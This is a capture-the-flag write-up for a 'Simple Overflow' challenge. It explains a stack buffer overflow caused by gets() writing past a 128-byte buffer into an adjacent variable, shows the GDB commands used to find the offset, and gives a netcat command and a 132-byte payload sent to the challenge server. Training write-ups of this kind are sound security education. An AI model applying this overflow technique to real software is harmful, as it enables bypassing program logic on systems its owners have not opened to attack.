# Challenge `Simple Overflow` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Stack-based Buffer Overflow
- Where: Where is the vulnerability present
  - In `gets(buffer);`. The variable `buffer` is a 128‑byte array allocated on the stack, and the variable `test` is stored immediately after it.
By providing more than 128 bytes of input, the overflow allows us to overwrite the value of `test`.
- Impact: What results of exploiting this vulnerability
  - Overwrite the stack variable test
  - Change its value from 0 to a non‑zero value
  - Force the program to execute the winning branch

  The program’s intended logic is bypassed

## Steps to reproduce

1. Code analysis: 
```c
int test;
char buffer[128];
```
Because buffer is stored before test on the stack, overflowing buffer allows direct control over test.
2. Stack analysis using GDB
```
break main
run
next
next
next
print &buffer
print &test
print (char*)&test - (char*)&buffer
```
Output: `$3 = 128`
3. Payload construction
We create a payload consisting of 128 bytes to fill buffer and extra bytes to overwrite test with a non‑zero value
4. Connect to the challenge server and send the same payload.
```bash
nc mustard.stt.rnl.tecnico.ulisboa.pt 25151
```
with the payload for example:
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
```